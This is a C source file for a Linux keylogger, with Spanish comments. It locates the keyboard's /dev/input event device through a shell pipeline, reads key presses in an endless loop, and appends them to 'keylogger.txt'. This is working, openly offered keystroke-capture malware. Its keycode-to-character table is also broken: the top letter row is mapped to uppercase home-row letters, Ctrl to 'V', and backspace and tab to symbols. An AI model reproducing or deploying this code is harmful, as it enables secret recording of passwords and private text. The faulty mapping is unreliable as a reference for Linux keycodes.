#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>

#define LOGFILEPATH "keylogger.txt"

char *getEvent();
char keycode_to_char(int keycode);

int main() {
    struct input_event ev;
    static char path_keyboard[20] = "/dev/input/";
    strcat(path_keyboard, getEvent());
    path_keyboard[strlen(path_keyboard) - 1] = 0;

    int device_keyboard = open(path_keyboard, O_RDONLY);
    if (device_keyboard < 0) {
        perror("Error al abrir el dispositivo");
        exit(1);
    }

    FILE *fp = fopen(LOGFILEPATH, "a");
    if (fp == NULL) {
        perror("Error al abrir el archivo de log");
        close(device_keyboard);
        exit(1);
    }

    while (1) {
        ssize_t bytes_read = read(device_keyboard, &ev, sizeof(ev));
        if (bytes_read < 0) {
            perror("Error al leer del dispositivo");
            fclose(fp);
            close(device_keyboard);
            exit(1);
        }

        if (ev.type == EV_KEY && ev.value == 1) { // Solo teclas presionadas
            char ch = keycode_to_char(ev.code);
            if (ch != 0) { // Ignorar códigos de teclas no mapeadas
                fprintf(fp, "%c", ch);
                fflush(fp);
            }
        }
    }

    fclose(fp);
    close(device_keyboard);
    return 0;
}

char *getEvent() {
    char *command = "cat /proc/bus/input/devices | grep -C 5 keyboard | grep -E -o 'event[0-9]'";
    static char event[8];
    FILE *pipe = popen(command, "r");
    if (!pipe) {
        perror("Error al ejecutar el comando");
        exit(1);
    }
    fgets(event, 8, pipe);
    pclose(pipe);
    return event;
}

char keycode_to_char(int keycode) {
    // Mapeo básico de códigos de teclas a caracteres en español
    switch (keycode) {
        // Letras minúsculas
        case 30: return 'a';  // 'a'
        case 31: return 's';  // 's'
        case 32: return 'd';  // 'd'
        case 33: return 'f';  // 'f'
        case 34: return 'g';  // 'g'
        case 35: return 'h';  // 'h'
        case 36: return 'j';  // 'j'
        case 37: return 'k';  // 'k'
        case 38: return 'l';  // 'l'
        case 39: return ';';  // ';'
        case 44: return 'z';  // 'z'
        case 45: return 'x';  // 'x'
        case 46: return 'c';  // 'c'
        case 47: return 'v';  // 'v'
        case 48: return 'b';  // 'b'
        case 49: return 'n';  // 'n'
        case 50: return 'm';  // 'm'
        case 51: return ',';  // ','
        case 52: return '.';  // '.'
        case 53: return '/';  // '/'

        // Letras mayúsculas
        case 16: return 'A';  // 'A'
        case 17: return 'S';  // 'S'
        case 18: return 'D';  // 'D'
        case 19: return 'F';  // 'F'
        case 20: return 'G';  // 'G'
        case 21: return 'H';  // 'H'
        case 22: return 'J';  // 'J'
        case 23: return 'K';  // 'K'
        case 24: return 'L';  // 'L'
        case 25: return ':';  // ':'
        case 26: return 'Z';  // 'Z'
        case 27: return 'X';  // 'X'
        case 29: return 'V';  // 'V'

        // Caracteres especiales comunes
        case 2: return '1';  // '1'
        case 3: return '2';  // '2'
        case 4: return '3';  // '3'
        case 5: return '4';  // '4'
        case 6: return '5';  // '5'
        case 7: return '6';  // '6'
        case 8: return '7';  // '7'
        case 9: return '8';  // '8'
        case 10: return '9'; // '9'
        case 11: return '0'; // '0'
        case 12: return '!'; // '!'
        case 13: return '@'; // '@'
        case 14: return '#'; // '#'
        case 15: return '$'; // '$'

        // Espacio
        case 57: return ' ';

        // Enter
        case 28: return '\n';

        case 58: return ':';  // : en teclado numérico

        // Teclas no mapeadas explícitamente
        default: return 0;
    }
}
